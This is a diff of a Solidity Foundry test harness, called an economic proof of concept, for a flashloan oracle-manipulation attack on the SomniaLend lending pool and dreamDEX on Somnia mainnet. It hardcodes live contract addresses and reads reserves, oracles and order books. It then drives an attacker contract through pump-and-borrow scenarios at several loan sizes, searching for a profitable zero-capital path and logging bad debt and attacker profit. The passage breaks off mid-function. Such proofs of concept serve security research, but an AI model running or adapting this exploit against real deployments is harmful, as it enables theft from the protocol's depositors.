@@ -2,9 +2,23 @@
 pragma solidity ^0.8.24;
 
 import {Test, console2} from "forge-std/Test.sol";
-import {IAaveOracle, IDreamDexSpotPool, IERC20, ISomniaLendPool, ReserveData} from "../src/Interfaces.sol";
+import {
+    IAaveOracle,
+    IDreamDexSpotPool,
+    IERC20,
+    ISomniaLendPool,
+    ReserveData,
+    SomniaConfigLib,
+    SomniaMetrics
+} from "../src/Interfaces.sol";
 import {SomniaLendAttack} from "../src/SomniaLendAttack.sol";
 
+/// @notice Pinned-fork harness for SomniaLend + dreamDEX.
+///
+/// Every scenario is zero-seed (no `deal`, no funding) unless the caller explicitly seeds a
+/// scenario through `_seed`, which is only used by the control. Scenario results are written to
+/// JSON whether the attack succeeds or reverts at repayment: a revert is a measured result, not
+/// a lost data point.
 contract SomniaLendEconomicPoCTest is Test {
     address internal constant POOL = 0xEC6758e6324c167DB39B6908036240460a2b0168;
     address internal constant ORACLE = 0x9b7B5d69a08071ce74C2f3D655038E3b782eAaFc;
@@ -13,250 +27,496 @@ contract SomniaLendEconomicPoCTest is Test {
     address internal constant WETH = 0x936Ab8C674bcb567CD5dEB85D8A216494704E9D8;
     address internal constant USDSO = 0x00000022dA000002656c64D9eA6011ea952D008A;
     address internal constant WBTC = 0xC5098b3cA516784323872F17235fa074E167D3D2;
+
     address internal constant SOMI_USDSO = 0x035De7403eac6872787779CCA7CCF1b4CDb61379;
     address internal constant USDC_USDSO = 0x47fD2f18426f67106DBaC82F6d21D446c5F2120b;
     address internal constant WETH_USDSO = 0xa936da11B57b50A344e1293AAaE5232885ea2bDE;
     address internal constant WBTC_USDSO = 0x25bfF6B7B5E2243424F38E75de7ab03C0522a5EA;
-    address internal constant DEX_PROXY_READER = 0x790554C0D6914Edb90F8d05B2f0bBc8560502660;
+
+    // dreamDEX SpotPool proxies resolve their implementation through this reader. The address is
+    // the low 20 bytes of the PUSH32 word in the deployed proxy runtime, verified from bytecode.
+    address internal constant DEX_PROXY_READER = 0x55790554C0d6914edb90F8d05B2f0bBc85605026;
     bytes32 internal constant EIP1967_IMPLEMENTATION =
         0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
 
     uint256 internal forkBlock;
-    uint256 internal somiFlash;
-    uint256 internal usdcFlash;
     uint256 internal buyLimitBps;
     uint256 internal sellLimitBps;
-    uint256 internal unwindLimitBps;
+    uint256 internal exitLimitBps;
     uint256 internal borrowBps;
     bool internal borrowAll;
-    bool internal unwind;
+    bool internal exitBorrowed;
+    bool internal expectProfitable;
 
     function setUp() public {
-        string memory rpc = vm.envString("SOMNIA_RPC_URL");
         forkBlock = vm.envUint("SOMNIA_FORK_BLOCK");
         require(forkBlock > 0, "pin SOMNIA_FORK_BLOCK");
-        vm.createSelectFork(rpc, forkBlock);
+        // Somnia RPC rejects EIP-1898 block objects, which Forge >= 1.8 sends on every fork read.
+        // This harness therefore requires Forge <= 1.7.x (foundryup -v 1.7.1).
+        vm.createSelectFork(vm.envString("SOMNIA_RPC_URL"), forkBlock);
         require(block.chainid == 5031, "not Somnia mainnet");
         require(block.number == forkBlock, "fork block mismatch");
 
-        somiFlash = vm.envOr("SOMI_FLASH_USDSO", uint256(25_000 ether));
-        usdcFlash = vm.envOr("USDSO_ATTACK_FLASH_USDC", uint256(1_000e6));
-        buyLimitBps = vm.envOr("DEX_BUY_LIMIT_BPS", uint256(11_000));
-        sellLimitBps = vm.envOr("DEX_SELL_LIMIT_BPS", uint256(9_000));
-        unwindLimitBps = vm.envOr("DEX_UNWIND_LIMIT_BPS", uint256(9_000));
+        buyLimitBps = vm.envOr("DEX_BUY_LIMIT_BPS", uint256(10_050));
+        sellLimitBps = vm.envOr("DEX_SELL_LIMIT_BPS", uint256(9_950));
+        exitLimitBps = vm.envOr("DEX_EXIT_LIMIT_BPS", uint256(9_950));
         borrowBps = vm.envOr("BORROW_BPS", uint256(10_000));
         borrowAll = vm.envOr("BORROW_ALL_OPPOSITE_RESERVES", false);
-        unwind = vm.envOr("UNWIND_LIQUID_SURPLUS", true);
+        exitBorrowed = vm.envOr("EXIT_BORROWED_ASSET", true);
+        expectProfitable = vm.envOr("EXPECT_PROFITABLE", false);
     }
 
+    // ─────────────────────────────────────────────────────────────────────────────
+    // Recon
+    // ─────────────────────────────────────────────────────────────────────────────
+
     function test_recon_exact_live_configuration() public view {
-        bytes32 implementationSlot = vm.load(POOL, EIP1967_IMPLEMENTATION);
         console2.log("fork block", block.number);
-        console2.log("Pool EIP-1967 implementation", address(uint160(uint256(implementationSlot))));
+        console2.log("pool implementation", address(uint160(uint256(vm.load(POOL, EIP1967_IMPLEMENTATION)))));
+        console2.log("oracle", ORACLE);
         console2.log("oracle base currency", IAaveOracle(ORACLE).BASE_CURRENCY());
         console2.log("oracle base unit", IAaveOracle(ORACLE).BASE_CURRENCY_UNIT());
-        console2.log("fallback oracle", IAaveOracle(ORACLE).getFallbackOracle());
-        console2.log("flash premium total bps", ISomniaLendPool(POOL).FLASHLOAN_PREMIUM_TOTAL());
+        console2.log("oracle fallback", IAaveOracle(ORACLE).getFallbackOracle());
+        console2.log("flash premium bps", ISomniaLendPool(POOL).FLASHLOAN_PREMIUM_TOTAL());
 
         address[] memory reserves = ISomniaLendPool(POOL).getReservesList();
         console2.log("reserve count", reserves.length);
-        for (uint256 i; i < reserves.length; ++i) {
-            address asset = reserves[i];
-            ReserveData memory reserve = ISomniaLendPool(POOL).getReserveData(asset);
-            address source = IAaveOracle(ORACLE).getSourceOfAsset(asset);
-            console2.log("--- reserve", asset);
-            console2.log("symbol", IERC20(asset).symbol());
-            console2.log("decimals", IERC20(asset).decimals());
-            console2.log("aToken", reserve.aTokenAddress);
-            console2.log("variableDebtToken", reserve.variableDebtTokenAddress);
-            console2.log("aToken cash", IERC20(asset).balanceOf(reserve.aTokenAddress));
-            console2.log("variable debt supply", IERC20(reserve.variableDebtTokenAddress).totalSupply());
-            console2.log("reserve configuration raw", reserve.configuration.data);
-            console2.log("oracle answer", IAaveOracle(ORACLE).getAssetPrice(asset));
-            console2.log("configured source", source);
-            console2.log("source code size", source.code.length);
-            if (source != address(0)) {
-                bytes32 feedImplementation = vm.load(source, EIP1967_IMPLEMENTATION);
-                console2.log(
-                    "feed EIP-1967 implementation (zero if not proxy)", address(uint160(uint256(feedImplementation)))
-                );
-            }
-            _logFeed(source);
-        }
+        require(reserves.length >= 2, "reserve list unavailable");
 
-        _logDex("SOMI/USDso", SOMI_USDSO);
-        _logDex("USDC.e/USDso", USDC_USDSO);
-        _logDex("WETH/USDso", WETH_USDSO);
-        _logDex("WBTC/USDso", WBTC_USDSO);
+        for (uint256 i; i < reserves.length; ++i) {
+            _logReserve(reserves[i]);
+        }
+        console2.log("flash premium bps", ISomniaLendPool(POOL).FLASHLOAN_PREMIUM_TOTAL());
+
+        _logMarket("SOMI/USDso", SOMI_USDSO);
+        _logMarket("USDC.e/USDso", USDC_USDSO);
+        _logMarket("WETH/USDso", WETH_USDSO);
+        _logMarket("WBTC/USDso", WBTC_USDSO);
+
+        // The decisive pre-trade number: how much cheaper the CLOB asks are than the price the
+        // protocol is willing to lend against. Buy at the ask, supply at the oracle; the gap is
+        // the free edge, and it must exceed (1+premium)/LTV - 1 to make the flashloan self-funding.
+        _logBasis("SOMI/USDso", SOMI_USDSO);
+        _logBasis("USDC.e/USDso", USDC_USDSO);
+        _logBasis("WETH/USDso", WETH_USDSO);
+        _logBasis("WBTC/USDso", WBTC_USDSO);
 
         (bool ok, bytes memory data) = DEX_PROXY_READER.staticcall(abi.encodeWithSignature("implementation()"));
         require(ok && data.length >= 32, "DEX implementation read failed");
         console2.log("SOMI SpotPool implementation", abi.decode(data, (address)));
+
+        // Harness integrity: the two markets under test must be populated and priced.
+        require(IAaveOracle(ORACLE).getAssetPrice(WSOMI) > 0, "no SOMI oracle price");
+        require(IAaveOracle(ORACLE).getAssetPrice(USDSO) > 0, "no USDso oracle price");
+        require(IAaveOracle(ORACLE).getAssetPrice(USDC) > 0, "no USDC oracle price");
+        require(_best(SOMI_USDSO, false) > 0, "empty SOMI ask book");
+        require(_best(USDC_USDSO, true) > 0, "empty USDC bid book");
     }
 
+    // ─────────────────────────────────────────────────────────────────────────────
+    // Control: flashloan without a trade must not move the oracle
+    // ─────────────────────────────────────────────────────────────────────────────
+
     function test_control_no_trade_no_oracle_delta() public {
-        uint256 premium = (somiFlash * ISomniaLendPool(POOL).FLASHLOAN_PREMIUM_TOTAL()) / 10_000;
-        SomniaLendAttack attacker = new SomniaLendAttack();
-        // Controls must repay without an attack. This seed is explicitly logged and is not profit.
+        uint256 amount = vm.envOr("CONTROL_FLASH_USDSO", uint256(1_000e18));
+        uint256 premium = (amount * ISomniaLendPool(POOL).FLASHLOAN_PREMIUM_TOTAL()) / 10_000;
+
+        SomniaLendAttack attacker = new SomniaLendAttack(SomniaConfigLib.mainnet());
+        // The control must repay a premium it never earned; this seed is logged and excluded from
+        // the "attack" accounting. It is not an exploit input.
         deal(USDSO, address(attacker), premium);
+        attacker.declareSeed(USDSO, premium);
+
         uint256 somiBefore = IAaveOracle(ORACLE).getAssetPrice(WSOMI);
         uint256 usdsoBefore = IAaveOracle(ORACLE).getAssetPrice(USDSO);
         uint256 usdcBefore = IAaveOracle(ORACLE).getAssetPrice(USDC);
 
-        attacker.runControl(USDSO, somiFlash);
+        attacker.runControl(USDSO, amount);
 
+        SomniaMetrics memory m = attacker.metrics();
         assertEq(IAaveOracle(ORACLE).getAssetPrice(WSOMI), somiBefore, "control moved SOMI");
         assertEq(IAaveOracle(ORACLE).getAssetPrice(USDSO), usdsoBefore, "control moved USDso");
         assertEq(IAaveOracle(ORACLE).getAssetPrice(USDC), usdcBefore, "control moved USDC");
-        assertEq(attacker.borrowedFlashAsset(), 0, "control borrowed");
-        assertEq(attacker.baseTraded(), 0, "control traded");
-        assertEq(attacker.netUsdsoDelta(), -int256(premium), "control cost mismatch");
-        _writeResult(attacker, "results/control.json", false);
+        assertEq(m.preTradeBaseTraded, 0, "control traded");
+        assertEq(m.totalDebtBase, 0, "control borrowed");
+        assertTrue(m.repaid, "control did not repay");
+
+        _write("control", m, "repaid", 0, 0);
     }
 
-    /// @dev Exploit assertion: no seed capital is supplied. An unprofitable/repayment-short
-    ///      attack is expected to make this test revert; use the instrumented test for full metrics.
-    function test_somi_atomic_zero_seed() public {
-        SomniaLendAttack attacker = new SomniaLendAttack();
-        attacker.runSomi(somiFlash, buyLimitBps, unwindLimitBps, borrowBps, borrowAll, unwind);
-        assertGt(attacker.baseTraded(), 0, "no SOMI execution");
-        assertGt(attacker.suppliedCollateral(), 0, "no WSOMI supplied");
-        assertGt(attacker.borrowedFlashAsset(), 0, "no USDso borrowed");
-        assertEq(attacker.finalUsdc(), 0, "unaccounted USDC seed/proceeds");
-        assertGt(attacker.netUsdsoDelta(), 0, "no positive atomic liquid P&L");
-        _writeResult(attacker, "results/somi-zero-seed.json", true);
-    }
+    // ─────────────────────────────────────────────────────────────────────────────
+    // Sweep: every atomic direction at several notional sizes
+    // ─────────────────────────────────────────────────────────────────────────────
 
-    /// @dev Measurement path: coverage permits a losing attack to finish repayment. Every seeded
-    ///      token is subtracted in the net vectors; this is not an exploit-profit assertion.
-    function test_somi_instrumented_with_loss_coverage() public {
-        SomniaLendAttack attacker = new SomniaLendAttack();
-        uint256 premium = (somiFlash * ISomniaLendPool(POOL).FLASHLOAN_PREMIUM_TOTAL()) / 10_000;
-        deal(USDSO, address(attacker), somiFlash + premium);
-        attacker.runSomi(somiFlash, buyLimitBps, unwindLimitBps, borrowBps, borrowAll, unwind);
-        assertGt(attacker.baseTraded(), 0, "no SOMI execution");
-        assertGt(attacker.suppliedCollateral(), 0, "no WSOMI supplied");
-        assertGt(attacker.borrowedFlashAsset(), 0, "no USDso borrowed");
-        _writeResult(attacker, "results/somi-instrumented.json", false);
-    }
+    function test_sweep_atomic_directions() public {
+        uint256[4] memory somiSizes = [
+            vm.envOr("SOMI_SWEEP_1", uint256(100e18)),
+            vm.envOr("SOMI_SWEEP_2", uint256(5_000e18)),
+            vm.envOr("SOMI_SWEEP_3", uint256(25_000e18)),
+            vm.envOr("SOMI_SWEEP_4", uint256(100_000e18))
+        ];
+        uint256[4] memory usdcSizes = [
+            vm.envOr("USDC_SWEEP_1", uint256(25e6)),
+            vm.envOr("USDC_SWEEP_2", uint256(1_000e6)),
+            vm.envOr("USDC_SWEEP_3", uint256(3_000e6)),
+            vm.envOr("USDC_SWEEP_4", uint256(6_000e6))
+        ];
 
-    function test_usdso_atomic_zero_seed() public {
-        SomniaLendAttack attacker = new SomniaLendAttack();
-        attacker.runUsdso(usdcFlash, sellLimitBps, unwindLimitBps, borrowBps, borrowAll, unwind);
-        assertGt(attacker.baseTraded(), 0, "no USDC execution");
-        assertGt(attacker.suppliedCollateral(), 0, "no USDso supplied");
-        assertGt(attacker.borrowedFlashAsset(), 0, "no USDC borrowed");
-        assertGt(attacker.netUsdsoDelta(), 0, "no positive atomic liquid P&L");
-        assertEq(attacker.netUsdcDelta(), 0, "unwound zero-seed P&L still has USDC exposure");
-        _writeResult(attacker, "results/usdso-zero-seed.json", true);
-    }
+        bool anyProfitable;
 
-    function test_usdso_instrumented_with_loss_coverage() public {
-        SomniaLendAttack attacker = new SomniaLendAttack();
-        uint256 premium = (usdcFlash * ISomniaLendPool(POOL).FLASHLOAN_PREMIUM_TOTAL()) / 10_000;
-        deal(USDC, address(attacker), usdcFlash + premium);
-        attacker.runUsdso(usdcFlash, sellLimitBps, unwindLimitBps, borrowBps, borrowAll, unwind);
-        assertGt(attacker.baseTraded(), 0, "no USDC execution");
-        assertGt(attacker.suppliedCollateral(), 0, "no USDso supplied");
-        assertGt(attacker.borrowedFlashAsset(), 0, "no USDC borrowed");
-        // A losing run can have negative USDC delta. It is deliberately NOT converted at the
-        // manipulated oracle; inspect both signed liquid deltas and the real unwind execution log.
-        _writeResult(attacker, "results/usdso-instrumented.json", false);
-    }
-
-    function _logFeed(address source) internal view {
-        if (source == address(0)) return;
-        (bool decimalsOk, bytes memory decimalsData) = source.staticcall(abi.encodeWithSignature("decimals()"));
-        if (decimalsOk && decimalsData.length >= 32) {
-            console2.log("feed decimals", abi.decode(decimalsData, (uint8)));
+        for (uint256 i; i < somiSizes.length; ++i) {
+            if (somiSizes[i] == 0) continue;
+            uint256 snap = vm.snapshot();
+            (SomniaMetrics memory m, bool ok, string memory outcome) =
+                _runSomiPump(somiSizes[i]);
+            _report("somi-pump-supply", somiSizes[i], m, ok, outcome);
+            if (_profitable(m)) anyProfitable = true;
+            vm.revertTo(snap);
         }
-        (bool ok, bytes memory data) = source.staticcall(abi.encodeWithSignature("latestRoundData()"));
-        if (ok && data.length >= 160) {
-            (uint80 roundId, int256 answer, uint256 startedAt, uint256 updatedAt, uint80 answeredInRound) =
-                abi.decode(data, (uint80, int256, uint256, uint256, uint80));
-            console2.log("feed round", roundId);
-            console2.log("feed answer", answer);
-            console2.log("feed startedAt", startedAt);
-            console2.log("feed updatedAt", updatedAt);
-            console2.log("feed answeredInRound", answeredInRound);
-            console2.log("chain timestamp", block.timestamp);
-        } else {
-            (bool answerOk, bytes memory answerData) = source.staticcall(abi.encodeWithSignature("latestAnswer()"));
-            (bool timeOk, bytes memory timeData) = source.staticcall(abi.encodeWithSignature("latestTimestamp()"));
-            console2.log("latestRoundData unsupported; latestAnswer status", answerOk);
-            if (answerOk && answerData.length >= 32) console2.log("feed answer", abi.decode(answerData, (int256)));
-            if (timeOk && timeData.length >= 32) console2.log("feed timestamp", abi.decode(timeData, (uint256)));
+
+        for (uint256 i; i < usdcSizes.length; ++i) {
+            if (usdcSizes[i] == 0) continue;
+            uint256 snap = vm.snapshot();
+            (SomniaMetrics memory m, bool ok, string memory outcome) =
+                _runUsdsoPump(usdcSizes[i]);
+            _report("usdso-pump-supply", usdcSizes[i], m, ok, outcome);
+            if (_profitable(m)) anyProfitable = true;
+            vm.revertTo(snap);
+        }
+
+        console2.log("======== SUMMARY ========");
+        console2.log("ANY PROFITABLE ATOMIC ZERO-SEED PATH", anyProfitable);
+        if (expectProfitable) require(anyProfitable, "no profitable atomic path at pinned block");
+    }
+
+    // ─────────────────────────────────────────────────────────────────────────────
+    // Scenario drivers
+    // ─────────────────────────────────────────────────────────────────────────────
+
+    function _runSomiPump(uint256 amount)
+        internal
+        returns (SomniaMetrics memory m, bool ok, string memory outcome)
+    {
+        SomniaLendAttack attacker = new SomniaLendAttack(SomniaConfigLib.mainnet());
+        SomniaLendAttack.Params memory p = SomniaLendAttack.Params({
+            buyLimitBps: buyLimitBps,
+            sellLimitBps: exitLimitBps,
+            borrowBps: borrowBps,
+            borrowAll: borrowAll,
+            exitBorrowed: exitBorrowed
+        });
+        try attacker.runSomiPumpSupply(amount, p) {
+            m = attacker.metrics();
+            ok = true;
+            outcome = "repaid";
+        } catch (bytes memory reason) {
+            m = _decode(reason);
+            outcome = _reason(reason);
         }
     }
 
-    function _logDex(string memory label, address dexPool) internal view {
-        (
-            address base,
-            address quote,
-            uint256 makerFee,
-            uint256 takerFee,
-            uint256 tick,
-            uint256 minQuantity,
-            uint256 lot
-        ) = IDreamDexSpotPool(dexPool).getPoolParams();
-        console2.log("--- DEX market", label);
-        console2.log("pool", dexPool);
-        console2.log("base", base);
-        console2.log("quote", quote);
-        console2.log("maker fee bps*1000", makerFee);
-        console2.log("taker fee bps*1000", takerFee);
-        console2.log("tick", tick);
-        console2.log("minimum quantity", minQuantity);
-        console2.log("lot", lot);
-        _logBook(dexPool, true);
-        _logBook(dexPool, false);
-    }
-
-    function _logBook(address dexPool, bool isBid) internal view {
-        IDreamDexSpotPool.BookLevel[] memory levels = IDreamDexSpotPool(dexPool).getBookLevels(isBid, 5);
-        console2.log("book isBid", isBid);
-        console2.log("returned levels", levels.length);
-        for (uint256 i; i < levels.length; ++i) {
-            console2.log("level price", levels[i].price);
-            console2.log("level quantity", levels[i].quantity);
+    function _runUsdsoPump(uint256 amount)
+        internal
+        returns (SomniaMetrics memory m, bool ok, string memory outcome)
+    {
+        SomniaLendAttack attacker = new SomniaLendAttack(SomniaConfigLib.mainnet());
+        SomniaLendAttack.Params memory p = SomniaLendAttack.Params({
+            buyLimitBps: buyLimitBps,
+            sellLimitBps: sellLimitBps,
+            borrowBps: borrowBps,
+            borrowAll: borrowAll,
+            exitBorrowed: exitBorrowed
+        });
+        try attacker.runUsdsoPumpSupply(amount, p) {
+            m = attacker.metrics();
+            ok = true;
+            outcome = "repaid";
+        } catch (bytes memory reason) {
+            m = _decode(reason);
+            outcome = _reason(reason);
         }
     }
 
-    function _writeResult(SomniaLendAttack attacker, string memory path, bool zeroSeed) internal {
-        string memory json = vm.serializeUint("result", "forkBlock", forkBlock);
-        json = vm.serializeBool("result", "zeroSeed", zeroSeed);
-        json = vm.serializeUint("result", "flashPremium", attacker.flashPremium());
-        json = vm.serializeUint("result", "flashRepayment", attacker.flashRepayment());
-        json = vm.serializeUint("result", "collateralOracleBefore", attacker.collateralOracleBefore());
-        json = vm.serializeUint("result", "collateralOracleAfterTrade", attacker.collateralOracleAfterTrade());
-        json = vm.serializeUint("result", "debtOracleBefore", attacker.debtOracleBefore());
-        json = vm.serializeUint("result", "debtOracleAfterTrade", attacker.debtOracleAfterTrade());
-        json = vm.serializeUint("result", "dexBestBefore", attacker.dexBestBefore());
-        json = vm.serializeUint("result", "dexBestAfter", attacker.dexBestAfter());
-        json = vm.serializeUint("result", "executionPriceRaw", attacker.executionPriceRaw());
-        json = vm.serializeUint("result", "baseTraded", attacker.baseTraded());
-        json = vm.serializeUint("result", "quoteTraded", attacker.quoteTraded());
-        json = vm.serializeUint("result", "suppliedCollateral", attacker.suppliedCollateral());
-        json = vm.serializeUint("result", "baselineBorrowPowerBase", attacker.baselineBorrowPowerBase());
-        json = vm.serializeUint("result", "postSupplyAvailableBorrowsBase", attacker.postSupplyAvailableBorrowsBase());
-        json = vm.serializeUint("result", "borrowPowerIncreaseBase", attacker.borrowPowerIncreaseBase());
-        json = vm.serializeUint("result", "borrowedFlashAsset", attacker.borrowedFlashAsset());
-        json = vm.serializeUint("result", "borrowedUSDC", attacker.borrowed(USDC));
-        json = vm.serializeUint("result", "borrowedUSDso", attacker.borrowed(USDSO));
-        json = vm.serializeUint("result", "borrowedWETH", attacker.borrowed(WETH));
-        json = vm.serializeUint("result", "borrowedWBTC", attacker.borrowed(WBTC));
-        json = vm.serializeUint("result", "borrowedWSOMI", attacker.borrowed(WSOMI));
-        json = vm.serializeUint("result", "totalCollateralBase", attacker.totalCollateralBase());
-        json = vm.serializeUint("result", "totalDebtBase", attacker.totalDebtBase());
-        json = vm.serializeUint("result", "badDebtNowBase", attacker.badDebtNowBase());
-        json = vm.serializeUint("result", "debtIfCollateralZeroBase", attacker.debtIfCollateralZeroBase());
-        json = vm.serializeUint("result", "healthFactor", attacker.healthFactor());
-        json = vm.serializeInt("result", "netLiquidUSDsoDelta", attacker.netUsdsoDelta());
-        json = vm.serializeInt("result", "netLiquidUSDCDelta", attacker.netUsdcDelta());
-        json = vm.serializeInt("result", "netLiquidWETHDelta", attacker.netWethDelta());
-        json = vm.serializeInt("result", "netLiquidWBTCDelta", attacker.netWbtcDelta());
-        json = vm.serializeUint("result", "finalNativeSOMI", attacker.finalNative());
-        json = vm.serializeUint("result", "approxExecutionGasNotReceiptGas", attacker.gasUsedApprox());
-        vm.writeJson(json, path);
+    /// @dev A path is only profitable if it repaid the flashloan and kept a strictly positive
+    ///      liquid USDso balance, with no residual debt-asset liability in the wallet.
+    function _profitable(SomniaMetrics memory m) internal pure returns (bool) {
+        if (!m.repaid) return false;
+        if (!m.zeroSeed) return false;
+        return m.attackerLiquidBase > m.seededBase;
+    }
+
+    function _moveBps(uint256 before, uint256 after_) internal pure returns (uint256) {
+        if (before == 0 || after_ <= before) return 0;
+        return ((after_ - before) * 10_000) / before;
+    }
+
+    function _decode(bytes memory reason) internal pure returns (SomniaMetrics memory m) {
+        if (reason.length < 4) return m;
+        bytes4 sel;
+        assembly {
+            sel := mload(add(reason, 32))
+        }
+        if (sel != SomniaLendAttack.Shortfall.selector && sel != SomniaLendAttack.Aborted.selector) return m;
+        bytes memory body = _strip(reason);
+        if (sel == SomniaLendAttack.Shortfall.selector) {
+            return abi.decode(abi.decode(body, (bytes)), (SomniaMetrics));
+        }
+        (bytes memory payload,) = abi.decode(body, (bytes, bytes));
+        return abi.decode(payload, (SomniaMetrics));
+    }
+
+    function _strip(bytes memory data) internal pure returns (bytes memory out) {
+        out = new bytes(data.length - 4);
+        for (uint256 i; i < out.length; ++i) out[i] = data[i + 4];
+    }
+
+    /// @dev Human-readable outcome, including which leg failed. This is what makes a barren fork
+    ///      run diagnostic instead of silent.
+    function _reason(bytes memory reason) internal pure returns (string memory) {
+        if (reason.length < 4) return "revert";
+        bytes4 sel;
+        assembly {
+            sel := mload(add(reason, 32))
+        }
+        bytes memory body = _strip(reason);
+        if (sel == SomniaLendAttack.Shortfall.selector) return "repayment-shortfall";
+        if (sel == SomniaLendAttack.Aborted.selector) {
+            (, bytes memory inner) = abi.decode(body, (bytes, bytes));
+            return string.concat("aborted:", _message(inner));
+        }
+        return _message(reason);
+    }
+
+    function _message(bytes memory reason) internal pure returns (string memory) {
+        if (reason.length < 4) return "empty";
+        bytes4 sel;
+        assembly {
+            sel := mload(add(reason, 32))
+        }
+        if (sel != 0x08c379a0) return "custom-error";
+        return abi.decode(_strip(reason), (string));
+    }
+
+    // ─────────────────────────────────────────────────────────────────────────────
+    // Reporting
+    // ─────────────────────────────────────────────────────────────────────────────
+
+    function _report(string memory name, uint256 amount, SomniaMetrics memory m, bool ok, string memory outcome)
+        internal
+    {
+        console2.log("---------- scenario", name, amount);
+        console2.log("  outcome", outcome);
+        console2.log("  pre-trade base traded", m.preTradeBaseTraded);
+        console2.log("  pre-trade quote traded", m.preTradeQuoteTraded);
+        console2.log("  pre-trade exec price", m.preTradeExecPrice);
+        console2.log("  oracle collateral before", m.collateralOracleBefore);
+        console2.log("  oracle collateral after", m.collateralOracleAfter);
+        console2.log("  oracle debt before", m.debtOracleBefore);
+        console2.log("  oracle debt after", m.debtOracleAfter);
+        console2.log("  best bid before/after", m.bestBidBefore, m.bestBidAfter);
+        console2.log("  best ask before/after", m.bestAskBefore, m.bestAskAfter);
+        console2.log("  supplied", m.suppliedCollateral);
+        console2.log("  ltv bps", m.ltvBps);
+        console2.log("  baseline borrow base", m.baselineBorrowPowerBase);
+        console2.log("  actual borrow base", m.postSupplyAvailableBorrowsBase);
+        console2.log("  borrowed USDso", m.borrowUsdso);
+        console2.log("  borrowed USDC", m.borrowUsdc);
+        console2.log("  borrowed WETH", m.borrowWeth);
+        console2.log("  borrowed WBTC", m.borrowWbtc);
+        console2.log("  borrowed WSOMI", m.borrowWsomi);
+        console2.log("  exit base sold", m.exitBaseSold);
+        console2.log("  exit USDso proceeds", m.exitQuoteProceeds);
+        console2.log("  final USDso", m.finalUsdso);
+        console2.log("  final USDC", m.finalUsdc);
+        console2.log("  debt base", m.totalDebtBase);
+        console2.log("  collateral base", m.totalCollateralBase);
+        console2.log("  health factor", m.healthFactor);
+        console2.log("  unspent flash principal", m.unspentFlashAsset);
+        console2.log("  repayment base", m.repaymentBase);
+        console2.log("  COVERAGE bps", m.coverageBps);
+        console2.log("  UNIT EDGE bps", m.unitEdgeBps);
+        console2.log("  EDGE REQUIRED bps", m.edgeRequiredBps);
+        console2.log("  borrow power inflation base", m.borrowPowerInflationBase);
+        console2.log("  MAX NET ATOMIC base", m.maxNetBase);
+        console2.log("  BREAKEVEN LTV bps", m.breakevenLtvBps);
+        console2.log("  bad debt base", m.badDebtBase);
+        console2.log("  attacker liquid value base", m.attackerLiquidBase);
+        console2.log("  seeded base (0 = zero-seed)", m.seededBase);
+        console2.log("  shortfall (flash asset units)", m.shortfallFlashAsset);
+        console2.log("  shortfall (base units)", m.shortfallBase);
+        console2.log("  repaid", m.repaid);
+        console2.log("  PROFITABLE", _profitable(m));
+
+        _write(name, m, outcome, amount, ok ? 1 : 0);
+    }
+
+    function _write(string memory name, SomniaMetrics memory m, string memory outcome, uint256 amount, uint256 ok)
+        internal
+    {
+        string memory key = "result";
+        string memory json = vm.serializeUint(key, "forkBlock", forkBlock);
+        json = vm.serializeString(key, "scenario", name);
+        json = vm.serializeString(key, "outcome", outcome);
+        json = vm.serializeUint(key, "repaid", m.repaid ? 1 : 0);
+        json = vm.serializeUint(key, "callSucceeded", ok);
+        json = vm.serializeUint(key, "requestedNotional", amount);
+        json = vm.serializeUint(key, "flashAmount", m.flashAmount);
+        json = vm.serializeUint(key, "flashPremium", m.flashPremium);
+        json = vm.serializeUint(key, "flashRepayment", m.flashRepayment);
+        json = vm.serializeUint(key, "suppliedCollateral", m.suppliedCollateral);
+        json = vm.serializeUint(key, "ltvBps", m.ltvBps);
+        json = vm.serializeUint(key, "collateralOracleBefore", m.collateralOracleBefore);
+        json = vm.serializeUint(key, "collateralOracleAfter", m.collateralOracleAfter);
+        json = vm.serializeUint(key, "debtOracleBefore", m.debtOracleBefore);
+        json = vm.serializeUint(key, "debtOracleAfter", m.debtOracleAfter);
+        json = vm.serializeInt(key, "collateralFeedAnswerBefore", m.collateralFeedAnswerBefore);
+        json = vm.serializeInt(key, "collateralFeedAnswerAfter", m.collateralFeedAnswerAfter);
+        json = vm.serializeUint(key, "collateralFeedUpdatedAtBefore", m.collateralFeedUpdatedAtBefore);
+        json = vm.serializeUint(key, "collateralFeedUpdatedAtAfter", m.collateralFeedUpdatedAtAfter);
+        json = vm.serializeUint(key, "bestBidBefore", m.bestBidBefore);
+        json = vm.serializeUint(key, "bestAskBefore", m.bestAskBefore);
+        json = vm.serializeUint(key, "bestBidAfter", m.bestBidAfter);
+        json = vm.serializeUint(key, "bestAskAfter", m.bestAskAfter);
+        json = vm.serializeUint(key, "preTradeBaseTraded", m.preTradeBaseTraded);
+        json = vm.serializeUint(key, "preTradeQuoteTraded", m.preTradeQuoteTraded);
+        json = vm.serializeUint(key, "preTradeExecPrice", m.preTradeExecPrice);
+        json = vm.serializeUint(key, "baselineBorrowPowerBase", m.baselineBorrowPowerBase);
+        json = vm.serializeUint(key, "postSupplyAvailableBorrowsBase", m.postSupplyAvailableBorrowsBase);
+        json = vm.serializeUint(key, "borrowUsdso", m.borrowUsdso);
+        json = vm.serializeUint(key, "borrowUsdc", m.borrowUsdc);
+        json = vm.serializeUint(key, "borrowWeth", m.borrowWeth);
+        json = vm.serializeUint(key, "borrowWbtc", m.borrowWbtc);
+        json = vm.serializeUint(key, "borrowWsomi", m.borrowWsomi);
+        json = vm.serializeUint(key, "exitBaseSold", m.exitBaseSold);
+        json = vm.serializeUint(key, "exitQuoteProceeds", m.exitQuoteProceeds);
+        json = vm.serializeUint(key, "exitExecPrice", m.exitExecPrice);
+        json = vm.serializeUint(key, "totalCollateralBase", m.totalCollateralBase);
+        json = vm.serializeUint(key, "totalDebtBase", m.totalDebtBase);
+        json = vm.serializeUint(key, "healthFactor", m.healthFactor);
+        json = vm.serializeUint(key, "finalUsdso", m.finalUsdso);
+        json = vm.serializeUint(key, "finalUsdc", m.finalUsdc);
+        json = vm.serializeUint(key, "finalWeth", m.finalWeth);
+        json = vm.serializeUint(key, "finalWbtc", m.finalWbtc);
+        json = vm.serializeUint(key, "finalNative", m.finalNative);
+        json = vm.serializeUint(key, "finalWsomi", m.finalWsomi);
+        json = vm.serializeUint(key, "unspentFlashAsset", m.unspentFlashAsset);
+        json = vm.serializeUint(key, "repaymentBase", m.repaymentBase);
+        json = vm.serializeUint(key, "coverageBps", m.coverageBps);
+        json = vm.serializeInt(key, "unitEdgeBps", m.unitEdgeBps);
